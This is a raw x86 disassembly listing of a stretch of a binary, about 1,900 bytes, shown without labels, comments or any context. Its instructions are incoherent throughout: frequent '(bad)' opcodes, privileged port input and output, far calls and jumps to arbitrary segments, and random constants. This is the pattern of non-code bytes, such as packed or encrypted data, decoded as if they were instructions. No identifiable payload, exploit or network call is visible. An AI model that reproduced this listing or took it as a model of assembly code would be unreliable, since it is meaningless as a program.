  417a7b:	xor    esi,DWORD PTR [esi+0x4eb549aa]
  417a81:	mov    ss,WORD PTR [ecx]
  417a83:	pushf  
  417a84:	push   edx
  417a85:	adc    cl,BYTE PTR [edx-0x73655317]
  417a8b:	es inc eax
  417a8d:	mov    ds:0x736074bb,al
  417a92:	sbb    DWORD PTR [eax],eax
  417a94:	shl    DWORD PTR [esi+0x22],0x29
  417a98:	mov    esi,0xfa0c9a28
  417a9d:	ins    DWORD PTR es:[edi],dx
  417a9e:	add    eax,0xc728b6a6
  417aa3:	scas   eax,DWORD PTR es:[edi]
  417aa4:	(bad)  
  417aa5:	icebp  
  417aa6:	sub    BYTE PTR [eax],bl
  417aa8:	outs   dx,BYTE PTR ds:[esi]
  417aa9:	les    edi,FWORD PTR [esi-0x1f]
  417aac:	xor    al,0x5f
  417aae:	mov    eax,ds:0x70f29494
  417ab3:	add    BYTE PTR fs:[bp-0x27ff],dh
  417ab9:	push   ebp
  417aba:	dec    ebp
  417abb:	cmp    al,0x41
  417abd:	add    cl,dl
  417abf:	pop    edi
  417ac0:	or     dl,BYTE PTR [esi+0x55]
  417ac3:	cmp    BYTE PTR [eax-0x486910fc],bh
  417ac9:	int3   
  417aca:	pusha  
  417acb:	push   0x74
  417acd:	pop    ebx
  417ace:	shl    DWORD PTR ds:0x14e85062,cl
  417ad4:	cmp    bl,BYTE PTR [esi]
  417ad6:	out    dx,al
  417ad7:	add    al,0x86
  417ad9:	imul   ebx,DWORD PTR [ecx],0xf
  417adc:	inc    edx
  417add:	mov    ebp,0x68245a3d
  417ae2:	or     al,BYTE PTR gs:[edx+0x75666282]
  417ae9:	cmp    al,0x89
  417aeb:	lods   eax,DWORD PTR ds:[esi]
  417aec:	retf   
  417aed:	lock sahf 
  417aef:	pop    ds
  417af0:	ds pop esp
  417af2:	or     BYTE PTR [esi-0x55e55b41],bh
  417af8:	fiadd  DWORD PTR [ebp-0x1a9bccb6]
  417afe:	pop    edx
  417aff:	dec    ebp
  417b00:	mov    esp,0xd0b625ce
  417b05:	mov    edx,0x93a73c2
  417b0a:	or     BYTE PTR [ebx+ebp*4-0x268b24cb],dh
  417b11:	in     eax,0xe2
  417b13:	hlt    
  417b14:	inc    esp
  417b15:	push   edx
  417b16:	ins    BYTE PTR es:[edi],dx
  417b17:	ret    0x8329
  417b1a:	aaa    
  417b1b:	sbb    ch,ah
  417b1d:	aaa    
  417b1e:	pop    esi
  417b1f:	loop   0x417b36
  417b21:	mov    BYTE PTR [edx-0x687f835a],ch
  417b27:	add    BYTE PTR [edx+0x4b],bl
  417b2a:	lods   al,BYTE PTR ds:[esi]
  417b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b2c:	cwde   
  417b2d:	pop    edi
  417b2e:	push   cs
  417b2f:	inc    esi
  417b30:	inc    ebx
  417b31:	(bad)  
  417b32:	xor    esp,DWORD PTR [esi]
  417b34:	jge    0x417b96
  417b36:	ficomp DWORD PTR [eax-0x79de4a3f]
  417b3c:	adc    cl,al
  417b3e:	fadd   QWORD PTR [edx+0x56]
  417b41:	inc    esi
  417b42:	pop    ss
  417b43:	add    al,0xdc
  417b45:	cmp    al,0xaa
  417b47:	adc    ebx,DWORD PTR ds:0xccbc0255
  417b4d:	or     al,0xe0
  417b4f:	fld    TBYTE PTR [eax+0x711c0eb2]
  417b55:	call   0x3524:0xea2abd3c
  417b5c:	loopne 0x417b55
  417b5e:	dec    esp
  417b5f:	pop    esp
  417b60:	mov    ah,0xd
  417b62:	lods   eax,DWORD PTR ds:[esi]
  417b63:	mov    ch,0x1e
  417b65:	hlt    
  417b66:	repz mov al,ds:0x4aa4d0de
  417b6c:	imul   esp,DWORD PTR [eax-0x6c],0x4a1de347
  417b73:	shl    BYTE PTR [eax+0x92ce54],0x85
  417b7a:	popa   
  417b7b:	mov    DWORD PTR ds:0xfe46cb0,0xfb06a190
  417b85:	pop    edx
  417b86:	jle    0x417be2
  417b88:	scas   eax,DWORD PTR es:[edi]
  417b89:	cmp    dh,BYTE PTR gs:[edx+0x2a]
  417b8d:	mov    esp,0xad68d43d
  417b92:	mov    eax,ds:0xbbd2bec0
  417b97:	mov    WORD PTR [ecx],?
  417b99:	call   0x357f1067
  417b9e:	pushf  
  417b9f:	pusha  
  417ba0:	stos   DWORD PTR es:[edi],eax
  417ba1:	pushf  
  417ba2:	push   edi
  417ba3:	adc    BYTE PTR [edx],0xa9
  417ba6:	pop    edx
  417ba7:	add    al,0xc8
  417ba9:	jmp    DWORD PTR [ebx+0x43416c3]
  417baf:	dec    esp
  417bb0:	pop    edx
  417bb1:	pop    ebx
  417bb2:	hlt    
  417bb3:	call   0x3ba24606
  417bb8:	shl    DWORD PTR [ecx-0x7b812ee8],cl
  417bbe:	fild   WORD PTR [esi-0x12]
  417bc1:	int    0x89
  417bc3:	push   esp
  417bc4:	push   ebp
  417bc5:	jne    0x417bc7
  417bc7:	cmp    al,0x4b
  417bc9:	dec    esi
  417bca:	in     eax,dx
  417bcb:	pushf  
  417bcc:	fild   DWORD PTR [edx]
  417bce:	ins    BYTE PTR es:[edi],dx
  417bcf:	inc    edi
  417bd0:	fiadd  DWORD PTR [esp+esi*4]
  417bd3:	enter  0x880,0xa6
  417bd7:	lock not dh
  417bda:	imul   edi,DWORD PTR [ebx],0xffffffbe
  417bdd:	lods   eax,DWORD PTR ds:[esi]
  417bde:	push   0xc8ccdbb2
  417be3:	xchg   esi,eax
  417be4:	and    BYTE PTR cs:[edx],cl
  417be7:	push   ss
  417be8:	lock inc ebx
  417bea:	inc    esp
  417beb:	mov    ds:0x28e31c90,eax
  417bf0:	push   eax
  417bf1:	ins    BYTE PTR es:[edi],dx
  417bf2:	cmp    BYTE PTR [eax],cl
  417bf4:	(bad)  
  417bf5:	push   esi
  417bf6:	cmp    BYTE PTR [edi+0x34ad3c2e],bh
  417bfc:	aam    0x92
  417bfe:	add    DWORD PTR [eax+0x79a19b70],ecx
  417c04:	sub    ecx,esp
  417c06:	iret   
  417c07:	pop    eax
  417c08:	push   cs
  417c09:	add    BYTE PTR [edi],ah
  417c0b:	push   esi
  417c0c:	sbb    dl,BYTE PTR gs:[edi+ecx*8+0xad983ce]
  417c14:	dec    esp
  417c15:	cs int3 
  417c17:	je     0x417bd7
  417c19:	fbld   TBYTE PTR [edx]
  417c1b:	ret    0xff35
  417c1e:	add    BYTE PTR [esi+0x72001232],0x4
  417c25:	add    BYTE PTR ds:0xab9b009a,bl
  417c2b:	in     eax,0x36
  417c2d:	call   0x9da6395b
  417c32:	add    BYTE PTR [ecx],dl
  417c34:	ins    DWORD PTR es:[edi],dx
  417c35:	out    dx,al
  417c36:	or     BYTE PTR [esi-0x4d],ah
  417c39:	imul   edi,DWORD PTR [ecx+ecx*1+0x1e4c829a],0x8e487c
  417c44:	mov    edx,0xa229f45
  417c49:	aam    0x4c
  417c4b:	inc    esi
  417c4c:	mov    ch,0x3e
  417c4e:	mov    dl,BYTE PTR [ebp+0x32]
  417c51:	scas   al,BYTE PTR es:[edi]
  417c52:	test   al,al
  417c54:	hlt    
  417c55:	(bad)  
  417c56:	out    0xf2,al
  417c58:	hlt    
  417c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c5a:	dec    ebx
  417c5b:	add    DWORD PTR [edx],esp
  417c5d:	pop    ecx
  417c5e:	les    ecx,FWORD PTR [eax+0x337700e9]
  417c64:	pop    edi
  417c65:	push   eax
  417c66:	shr    BYTE PTR [eax],1
  417c68:	mov    bl,0x4e
  417c6a:	out    dx,al
  417c6b:	add    BYTE PTR [edx-0x6],ch
  417c6e:	add    BYTE PTR [edx],al
  417c70:	add    ebx,esp
  417c72:	mov    ah,0xaa
  417c74:	punpckhbw mm6,QWORD PTR [edi]
  417c77:	push   eax
  417c78:	push   ss
  417c79:	loop   0x417cdb
  417c7b:	mov    ebx,DWORD PTR [edx-0x4eefc5d6]
  417c81:	push   ebp
  417c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c83:	pop    esi
  417c84:	fcomp  QWORD PTR [edi+0x78d860d4]
  417c8a:	ins    BYTE PTR es:[edi],dx
  417c8b:	sub    eax,0xfca14ae8
  417c90:	popa   
  417c91:	sbb    bh,BYTE PTR [edx+eiz*4-0x10]
  417c95:	xor    BYTE PTR [ebp+ebx*2-0x2f],bl
  417c99:	dec    esp
  417c9a:	arpl   dx,dx
  417c9c:	sub    al,0xc2
  417c9e:	and    eax,0x3aaea874
  417ca3:	xchg   esp,eax
  417ca4:	sub    BYTE PTR [eax],al
  417ca6:	mov    dl,0xb4
  417ca8:	outs   dx,BYTE PTR ds:[esi]
  417ca9:	adc    al,0x65
  417cac:	arpl   WORD PTR [esi-0x5fbdf244],di
  417cb2:	xor    eax,0x6730d2a8
  417cb7:	mov    ebx,0xea90dce2
  417cbc:	sub    dh,BYTE PTR [edx+0x5325e84d]
  417cc2:	push   ss
  417cc3:	mov    dh,0xe8
  417cc5:	sub    al,0xdf
  417cc7:	das    
  417cc8:	gs push esp
  417cca:	ins    BYTE PTR es:[edi],dx
  417ccb:	jo     0x417c95
  417ccd:	fst    DWORD PTR [esi]
  417ccf:	mov    DWORD PTR [ecx+ecx*8],esi
  417cd2:	xor    DWORD PTR [eax-0x79a62ffb],0x3ae8c8fa
  417cdc:	js     0x417ce6
  417cde:	push   esp
  417cdf:	pop    edx
  417ce0:	dec    esp
  417ce1:	adc    esi,eax
  417ce3:	test   al,0x37
  417ce5:	xchg   esp,edx
  417ce7:	scas   al,BYTE PTR es:[edi]
  417ce8:	data16 (bad) 
  417ceb:	pop    ebp
  417cec:	je     0x417d1a
  417cee:	imul   ecx,DWORD PTR [eax+edx*1],0x41
  417cf2:	inc    ebp
  417cf3:	jmp    0x417ca7
  417cf5:	or     ebx,DWORD PTR [edx-0x17f5abf8]
  417cfb:	mov    cs,WORD PTR [eax-0x40]
  417cfe:	push   esp
  417cff:	ss push esp
  417d01:	push   esi
  417d02:	inc    edi
  417d03:	out    dx,al
  417d04:	push   es
  417d05:	and    ebx,DWORD PTR [eax]
  417d07:	cmp    ecx,DWORD PTR [edx]
  417d09:	dec    esi
  417d0a:	pop    ds
  417d0b:	mov    ah,0x67
  417d0d:	mov    al,0x38
  417d0f:	jnp    0x417d27
  417d11:	xlat   BYTE PTR ss:[ebx]
  417d13:	jne    0x417d92
  417d15:	in     al,dx
  417d16:	(bad)  
  417d17:	ror    BYTE PTR [eax-0x52],1
  417d1a:	aad    0xc4
  417d1c:	add    BYTE PTR [ebx+0x53],dl
  417d1f:	inc    edi
  417d20:	test   eax,0x2fa3896
  417d25:	mov    BYTE PTR [ebx+ebp*4+0x68],ch
  417d29:	and    bh,BYTE PTR [edx+0x15]
  417d2c:	inc    eax
  417d2d:	mov    eax,ds:0x88c64b3a
  417d32:	shl    BYTE PTR [edx],0xc7
  417d35:	(bad)  
  417d36:	call   0x2c7e:0xcf858dd
  417d3d:	sub    BYTE PTR [eax],ch
  417d3f:	mov    dh,0x40
  417d41:	cmc    
  417d42:	xchg   ebx,eax
  417d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d44:	pop    esi
  417d45:	mov    ebp,0xde885ad8
  417d4a:	jbe    0x417d87
  417d4c:	push   ds
  417d4d:	imul   ebp,DWORD PTR [eax+eax*2-0x67],0xccf9be1b
  417d55:	add    eax,0xd4d114f2
  417d5a:	popa   
  417d5b:	mov    esi,0xcceea4ba
  417d60:	mov    eax,ds:0x28ea11e0
  417d65:	xor    al,ah
  417d67:	pop    ds
  417d68:	ins    BYTE PTR es:[edi],dx
  417d69:	push   eax
  417d6a:	sub    BYTE PTR [eax+0x4a],dh
  417d6d:	mov    cl,0xc2
  417d6f:	adc    ebp,ebx
  417d71:	inc    eax
  417d72:	lods   al,BYTE PTR ds:[esi]
  417d73:	pusha  
  417d74:	mov    ebx,0x83306dad
  417d79:	shl    dh,0x81
  417d7c:	outs   dx,DWORD PTR ds:[esi]
  417d7d:	jbe    0x417dc1
  417d7f:	push   0xffffff9c
  417d81:	ss jle 0x417d8d
  417d84:	sbb    eax,0xea8a0f8a
  417d89:	xchg   ebx,eax
  417d8a:	mov    DWORD PTR ds:0x36560e00,ebx
  417d90:	je     0x417e07
  417d92:	jo     0x417dd8
  417d94:	loope  0x417db9
  417d96:	sub    al,0xbe
  417d98:	jmp    0x51d0:0x326bd5c2
  417d9f:	dec    esi
  417da0:	xchg   edi,eax
  417da1:	push   ds
  417da2:	cmp    esi,DWORD PTR [edx-0x5d5e1719]
  417da8:	aad    0x2
  417daa:	in     al,0xbf
  417dac:	dec    eax
  417dad:	scas   eax,DWORD PTR es:[edi]
  417dae:	retf   0x4022
  417db1:	pop    ds
  417db2:	add    BYTE PTR ds:0xd058a225,bh
  417db8:	and    eax,0x65d8c83e
  417dbd:	call   0xdf5f:0xd0cfcf74
  417dc4:	xor    BYTE PTR [ecx],dl
  417dc6:	inc    edi
  417dc7:	adc    ah,BYTE PTR [eax-0x3]
  417dca:	push   0xffffffdb
  417dcc:	clc    
  417dcd:	dec    eax
  417dce:	lods   eax,DWORD PTR ds:[esi]
  417dcf:	lods   al,BYTE PTR ds:[esi]
  417dd0:	test   DWORD PTR [ebp+0x36979986],0xde1c37b6
  417dda:	retf   
  417ddb:	es stos BYTE PTR es:[edi],al
  417ddd:	dec    ebp
  417dde:	add    BYTE PTR ds:0x8e47dc76,dh
  417de4:	popa   
  417de5:	ins    BYTE PTR es:[edi],dx
  417de6:	(bad)  
  417de7:	(bad)  
  417de9:	lods   al,BYTE PTR ds:[esi]
  417dea:	gs sbb ah,cl
  417ded:	in     eax,dx
  417dee:	pop    eax
  417def:	and    edx,ebp
  417df1:	and    ah,BYTE PTR [ecx+edi*2-0x2716bf2c]
  417df8:	push   esi
  417df9:	dec    ebp
  417dfa:	jge    0x417dc7
  417dfc:	mov    dh,0xe5
  417dfe:	jle    0x417dfa
  417e00:	push   0x68
  417e02:	add    eax,0x8c464857
  417e07:	add    BYTE PTR [ebx],ah
  417e09:	xchg   esi,eax
  417e0a:	(bad)  
  417e0c:	sbb    eax,0xab68180a
  417e11:	pop    eax
  417e12:	(bad)  
  417e15:	push   ecx
  417e16:	ss pop edx
  417e18:	rcl    DWORD PTR [ebp-0x5c65abea],0xc6
  417e1f:	jecxz  0x417e17
  417e21:	adc    al,0x10
  417e23:	lea    eax,[eax]
  417e25:	fcomp  DWORD PTR [edx]
  417e27:	mov    edx,0x43f89868
  417e2c:	dec    esp
  417e2d:	mov    ah,0x54
  417e2f:	mov    esp,0xf61db1a4
  417e34:	inc    edx
  417e35:	cmp    ah,bh
  417e37:	out    0xe4,eax
  417e39:	and    BYTE PTR [ecx],ah
  417e3b:	xor    al,0xa
  417e3d:	scas   al,BYTE PTR es:[edi]
  417e3e:	sub    al,0x98
  417e40:	jbe    0x417df6
  417e42:	jmp    0x417ec2
  417e44:	inc    eax
  417e45:	or     eax,esp
  417e47:	fcomp  QWORD PTR [eax]
  417e49:	sub    esp,DWORD PTR [edx+0x1066f5be]
  417e4f:	add    DWORD PTR [edx+0x2],edi
  417e52:	adc    cl,ah
  417e54:	(bad)  
  417e55:	loope  0x417e61
  417e57:	adc    ch,BYTE PTR [edi+0x62]
  417e5a:	cdq    
  417e5b:	rol    DWORD PTR [eax],cl
  417e5d:	outs   dx,DWORD PTR ds:[esi]
  417e5e:	cmp    al,0xc1
  417e60:	add    BYTE PTR [ebx-0x3e],dl
  417e63:	mov    al,0xa0
  417e65:	mov    eax,ds:0x529eadfe
  417e6a:	rcl    BYTE PTR [ebp-0x7e5e8567],0xcd
  417e71:	imul   ebp,esp,0x769f4cfa
  417e77:	shl    DWORD PTR [esi+0x0],0xe3
  417e7b:	(bad)
  417e7f:	xchg   DWORD PTR cs:[ecx+0x6c],ebx
  417e83:	xor    al,0x14
  417e85:	mov    DWORD PTR [eax],esp
  417e87:	pushf  
  417e88:	push   cs
  417e89:	push   ds
  417e8a:	stos   BYTE PTR es:[edi],al
  417e8b:	xor    al,0x7c
  417e8d:	adc    dh,BYTE PTR [esi]
  417e8f:	push   esp
  417e90:	jo     0x417ea9
  417e92:	es jne 0x417ec9
  417e95:	push   eax
  417e96:	xor    BYTE PTR [eax-0x38],ah
  417e99:	mov    dh,0xae
  417e9b:	imul   eax,DWORD PTR [edx],0x69
  417e9e:	stos   BYTE PTR es:[edi],al
  417e9f:	aaa    
  417ea0:	dec    esp
  417ea1:	inc    ecx
  417ea2:	jnp    0x417f1a
  417ea4:	in     eax,dx
  417ea5:	mov    dh,0xa3
  417ea7:	mov    al,ds:0xac4859c8
  417eac:	rcl    BYTE PTR [eax],0x2f
  417eaf:	out    dx,al
  417eb0:	cwde   
  417eb1:	add    ah,al
  417eb3:	shl    BYTE PTR [edi],1
  417eb5:	sbb    bh,BYTE PTR [ebx-0x4bc9e156]
  417ebb:	dec    eax
  417ebc:	push   esi
  417ebd:	add    DWORD PTR [edi+ecx*1],eax
  417ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ec1:	pop    es
  417ec2:	imul   esi,DWORD PTR [eax-0x5f4ae982],0x77
  417ec9:	xchg   ebx,eax
  417eca:	mov    es,WORD PTR [esi-0x77a7ec91]
  417ed0:	(bad)  
  417ed1:	push   esp
  417ed2:	inc    edx
  417ed3:	sub    cl,ah
  417ed5:	pop    eax
  417ed6:	les    edx,FWORD PTR [eax-0x71]
  417ed9:	xchg   esi,eax
  417eda:	in     al,0x85
  417edc:	sub    al,BYTE PTR [edx+0x50]
  417edf:	aam    0xdc
  417ee1:	mov    ah,0xd8
  417ee3:	fbld   TBYTE PTR [edx-0xff817b5]
  417ee9:	outs   dx,BYTE PTR ds:[esi]
  417eea:	jno    0x417f5e
  417eec:	and    eax,0xb524c0c2
  417ef1:	mov    cs,edx
  417ef3:	push   es
  417ef4:	mov    ?,esp
  417ef6:	dec    edx
  417ef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ef8:	inc    ecx
  417ef9:	je     0x417ebe
  417efb:	dec    ecx
  417efc:	out    0x9a,al
  417efe:	aam    0xb5
  417f00:	inc    edi
  417f01:	sbb    DWORD PTR [edi-0x13966c70],ebx
  417f07:	push   esi
  417f08:	and    bl,BYTE PTR ds:0xb6826803
  417f0e:	pop    esi
  417f0f:	mov    ebx,ebp
  417f11:	sub    BYTE PTR [esi-0x6defa10a],bh
  417f17:	lods   al,BYTE PTR ds:[esi]
  417f18:	inc    eax
  417f19:	adc    ch,BYTE PTR [edx]
  417f1b:	mov    edx,0x5034d089
  417f20:	mov    al,ds:0x58ccc6a8
  417f25:	cmp    al,0x42
  417f27:	sub    DWORD PTR [eax],ecx
  417f29:	and    esp,DWORD PTR [eax]
  417f2b:	jbe    0x417f4d
  417f2d:	fs add eax,0x4e5426b0
  417f33:	pop    eax
  417f34:	jp     0x417f06
  417f36:	add    al,0x1c
  417f38:	not    dh
  417f3a:	ins    BYTE PTR es:[edi],dx
  417f3b:	sub    ch,BYTE PTR [eax+0x46]
  417f3e:	popa   
  417f3f:	fadd   st,st(7)
  417f41:	sub    BYTE PTR [edx],dh
  417f43:	jns    0x417ec5
  417f45:	rol    BYTE PTR [ecx],1
  417f47:	imul   ebp,DWORD PTR [edi],0xffffffa5
  417f4a:	sti    
  417f4b:	sub    al,0xf7
  417f4d:	imul   esi
  417f4f:	sub    BYTE PTR [edx],ah
  417f51:	(bad)  
  417f52:	or     BYTE PTR ds:0x40f46883,dh
  417f58:	(bad)  
  417f59:	arpl   WORD PTR [ebx+edx*1-0x66],sp
  417f5d:	push   eax
  417f5e:	dec    eax
  417f5f:	sub    BYTE PTR [eax+0x6047c088],bl
  417f65:	inc    ebp
  417f66:	mov    edx,0xeceaa458
  417f6b:	jmp    0xa20a:0xe2621db4
  417f72:	data16 test al,0xa2
  417f75:	sbb    ah,BYTE PTR [ebx-0x25f297fd]
  417f7b:	icebp  
  417f7c:	pop    esi
  417f7d:	cmp    al,0x20
  417f7f:	xchg   BYTE PTR [ecx+0x3c447b04],ah
  417f85:	pop    es
  417f86:	(bad)  
  417f87:	hlt    
  417f88:	cmp    BYTE PTR [edx+0x47],cl
  417f8b:	shl    BYTE PTR [edx],1
  417f8d:	into   
  417f8e:	push   esp
  417f8f:	mov    eax,eax
  417f91:	and    BYTE PTR [eax],ch
  417f93:	jo     0x417f16
  417f95:	xor    BYTE PTR [edx+edi*4+0xfc71bde],bl
  417f9c:	and    al,0xac
  417f9e:	push   ss
  417f9f:	jbe    0x417f2c
  417fa1:	cmp    dl,BYTE PTR [eax]
  417fa3:	xor    DWORD PTR [eax],eax
  417fa5:	pop    esp
  417fa6:	cmp    al,0xf8
  417fa8:	add    BYTE PTR [eax+0x41],ah
  417fab:	in     eax,0xde
  417fad:	jmp    0x417f41
  417faf:	enter  0xa124,0x4f
  417fb3:	push   eax
  417fb4:	(bad)  [ecx-0x7543939c]
  417fba:	xor    al,0x77
  417fbc:	fisubr DWORD PTR [ecx]
  417fbe:	or     al,0x96
  417fc0:	sub    eax,0x3c8206b0
  417fc5:	jns    0x417fd9
  417fc7:	push   0x6
  417fc9:	add    al,0x5b
  417fcb:	mov    eax,ds:0x3b46ee34
  417fd0:	icebp  
  417fd1:	fs inc eax
  417fd3:	sub    BYTE PTR [edx-0x4b],bl
  417fd6:	sahf   
  417fd7:	sbb    BYTE PTR [eax],ch
  417fd9:	test   edx,edi
  417fdb:	and    al,0xfc
  417fdd:	nop
  417fde:	call   0x504d:0xde47314
  417fe5:	xor    al,0x6f
  417fe7:	scas   eax,DWORD PTR es:[edi]
  417fe8:	xor    al,0xc0
  417fea:	inc    ebp
  417feb:	dec    esp
  417fec:	xchg   ebx,eax
  417fed:	add    BYTE PTR [eax+0x5f],ch
  417ff0:	pop    ebp
  417ff1:	call   0x235a:0xed4b0974
  417ff8:	imul   esp
  417ffa:	shr    BYTE PTR [ecx],0xaa
  417ffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ffe:	sbb    ebp,DWORD PTR [edx+edi*2-0x6f]
  418002:	add    BYTE PTR [esi+eiz*4-0x5e],ah
  418006:	pusha  
  418007:	mov    edx,0x41b6b3a5
  41800c:	fs xchg edi,eax
  41800e:	mov    es,WORD PTR [eax+0x9fa7de]
  418014:	fld    TBYTE PTR ss:[edx-0x7]
  418018:	je     0x417f9c
  41801a:	adc    BYTE PTR [edi+0x3c],ah
  41801d:	push   0xfffffffa
  41801f:	fs pop ebx
  418021:	mov    bl,0x1d
  418023:	sbb    BYTE PTR [edi],ah
  418025:	fisub  DWORD PTR [edx]
  418027:	call   0xf42e:0xa766ee5e
  41802e:	aam    0x26
  418030:	fmul   DWORD PTR [eax+0x162ac347]
  418036:	shl    BYTE PTR [eax-0x60],0xd
  41803a:	inc    ebp
  41803b:	mov    ebx,0xb6e1388a
  418040:	adc    ch,BYTE PTR [esi+0x64e01626]
  418046:	aam    0xf6
  418048:	add    eax,esp
  41804a:	add    BYTE PTR [eax+0x40528449],bh
  418050:	cmp    al,0x66
  418052:	ds dec eax
  418054:	mov    ah,0x5f
  418056:	xchg   esp,eax
  418057:	call   0x2f55:0x2cdb3412
  41805e:	adc    BYTE PTR [ebp+0x6096d210],bl
  418064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418065:	lods   eax,DWORD PTR ds:[esi]
  418066:	mov    ds:0x46c6cdd9,eax
  41806b:	idiv   BYTE PTR cs:[edx-0x19ae35c6]
  418072:	adc    bl,BYTE PTR [edx]
  418074:	or     cl,BYTE PTR [esi]
  418076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418077:	jne    0x4180a9
  418079:	pop    edi
  41807a:	sbb    ah,BYTE PTR [esi-0x1554bfb2]
  418080:	js     0x4180bb
  418082:	ror    cl,0xb8
  418085:	xor    cl,BYTE PTR [edi+ebp*4]
  418088:	popa   
  418089:	lods   al,BYTE PTR ds:[esi]
  41808a:	or     bl,BYTE PTR es:[eax-0x3598ef22]
  418091:	pusha  
  418092:	xchg   esp,eax
  418093:	pusha  
  418094:	sbb    eax,0x3adc5518
  418099:	jmp    0x4180b5
  41809b:	push   0xffffff92
  41809d:	cmp    BYTE PTR [eax-0x14],bh
  4180a0:	pop    ebx
  4180a1:	stos   BYTE PTR es:[edi],al
  4180a2:	mov    ds:0xe5f8a9a3,eax
  4180a7:	inc    esi
  4180a8:	ins    DWORD PTR es:[edi],dx
  4180a9:	push   es
  4180aa:	rcl    BYTE PTR [eax+edi*1+0x73],1
  4180ae:	mov    ch,0xad
  4180b0:	mov    eax,ds:0x7ec9b00
  4180b5:	call   0x7657fc69
  4180ba:	sub    al,0xf4
  4180bc:	ins    WORD PTR es:[edi],dx
  4180be:	inc    ecx
  4180bf:	inc    ecx
  4180c0:	loopne 0x4180d4
  4180c2:	mov    ss,WORD PTR [ebp+edi*1-0x1f]
  4180c6:	push   0xffffffbe
  4180c8:	pop    eax
  4180c9:	add    al,0xb4
  4180cb:	loop   0x4180e6
  4180cd:	shl    BYTE PTR [ecx],0xb9
  4180d0:	fcmovbe st,st(1)
  4180d2:	mov    ?,eax
  4180d4:	mov    ebx,0x7451a434
  4180da:	sbb    bh,dh
  4180dc:	sub    dl,BYTE PTR [ecx]
  4180de:	pop    ebp
  4180df:	push   cs
  4180e0:	add    DWORD PTR [edx-0x44],0x62
  4180e4:	bnd jbe 0x4180fd
  4180e7:	cmp    DWORD PTR [esi+0x7c],edx
  4180ea:	in     al,dx
  4180eb:	outs   dx,DWORD PTR ds:[esi]
  4180ec:	jbe    0x4180ac
  4180ee:	or     DWORD PTR [edx+0x5632e420],0x9e06fb43
  4180f8:	hlt    
  4180f9:	jl     0x418111
  4180fb:	or     al,0xda
  4180fe:	rol    BYTE PTR [eax],1
  418100:	(bad)  
  418102:	aas    
  418103:	pop    edi
  418104:	jnp    0x418138
  418106:	xchg   esi,eax
  418107:	adc    eax,0x87b2e8aa
  41810c:	push   ss
  41810d:	sub    al,0xc2
  41810f:	dec    esp
  418110:	and    BYTE PTR [ecx+0xa],ah
  418113:	lahf   
  418114:	das    
  418115:	lods   eax,DWORD PTR ds:[esi]
  418116:	adc    ch,BYTE PTR [eax+edx*2]
  418119:	test   BYTE PTR [esi+0x6],bl
  41811c:	in     al,0x24
  41811e:	jnp    0x41815e
  418120:	mov    BYTE PTR [esi-0x8bbfcfa],0x38
  418127:	dec    edx
  418128:	lods   al,BYTE PTR ds:[esi]
  418129:	adc    dl,BYTE PTR [eax-0xb]
  41812c:	pop    eax
  41812d:	es and eax,0x10e0063d
  418133:	lods   eax,DWORD PTR ds:[esi]
  418134:	ins    DWORD PTR es:[edi],dx
  418135:	jp     0x41814f
  418137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418138:	lods   al,BYTE PTR ds:[esi]
  418139:	ret    
  41813a:	jp     0x41814a
  41813c:	popf   
  41813d:	inc    eax
  41813e:	fs add al,0xb6
  418141:	or     BYTE PTR [edi-0x4a],0x2a
  418145:	pop    edx
  418146:	nop
  418147:	call   0x6d8f4e01
  41814c:	push   ebx
  41814d:	mov    ebx,0x4dac26ca
  418152:	xor    al,0xef
  418154:	jo     0x41817e
  418156:	mov    edi,0x3d7f1004
  41815b:	sbb    DWORD PTR [eax+0x40],ebp
  41815e:	jb     0x4181b8
  418160:	idiv   BYTE PTR [edx+0x36]
  418163:	add    BYTE PTR [ebx+0x4b5350c4],dh
  418169:	call   0xa460bc6
  41816e:	sub    ecx,DWORD PTR [esp+esi*1-0x74]
  418172:	cli    
  418173:	mov    DWORD PTR [ebp+0x64],0x7847b5bc
  41817a:	outs   dx,BYTE PTR ds:[esi]
  41817b:	xor    al,0x9a
  41817d:	out    dx,al
  41817e:	push   esp
  41817f:	adc    eax,DWORD PTR [eax]
  418181:	das    
  418182:	test   al,0x41
  418184:	mov    ah,0x43
  418186:	adc    BYTE PTR [esi],bl
  418188:	and    DWORD PTR [ebp-0x2959bb6e],edi
  41818e:	mov    al,ds:0x7c3a5350
  418193:	jle    0x418147
  418195:	bnd ja 0x418162
  418198:	push   es
  418199:	icebp  
  41819a:	xchg   ebx,eax
  41819b:	mov    al,0xb
  41819e:	ds retf 0x3a
  4181a2:	in     al,dx
  4181a3:	mov    dl,0xb5
  4181a5:	xor    dh,dl
  4181a7:	push   edx
  4181a8:	sahf   
  4181a9:	pop    es
  4181aa:	mov    eax,edi
  4181ac:	jbe    0x4181c8
  4181ae:	add    al,0x76
  4181b0:	jo     0x418197
  4181b2:	add    BYTE PTR [eax+0x6c6c726a],al
  4181b8:	xchg   edi,eax
  4181b9:	shr    BYTE PTR [esi+edx*1+0x3c1c6684],1
  4181c0:	xchg   ebp,eax
  4181c1:	sub    al,ch
  4181c3:	mov    BYTE PTR [edx+0x62],bh
  4181c6:	xor    al,0x44
  4181c8:	jbe    0x4181bb
  4181ca:	add    dl,cl
  4181cc:	or     eax,0x5ad246c0
  4181d1:	push   0x60f1146a
  4181d6:	nop
  4181d7:	cld    
  4181d8:	pop    esi
  4181d9:	pop    edi
  4181da:	or     ch,BYTE PTR [edx-0x4f376376]
  4181e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4181e1:	xchg   esi,eax
  4181e2:	scas   al,BYTE PTR es:[edi]
  4181e3:	adc    ch,bh
  4181e5:	rol    DWORD PTR [edx],cl
  4181e7:	xor    ebp,DWORD PTR [edx]
  4181e9:	jo     0x418221
  4181eb:	or     al,0xcc
  4181ed:	loop   0x4181ba
  4181ef:	push   0x5
  4181f1:	pop    ss
  4181f2:	ret    0x6426
  4181f5:	outs   dx,BYTE PTR ds:[esi]
  4181f6:	xchg   esp,eax
  4181f7:	push   cs
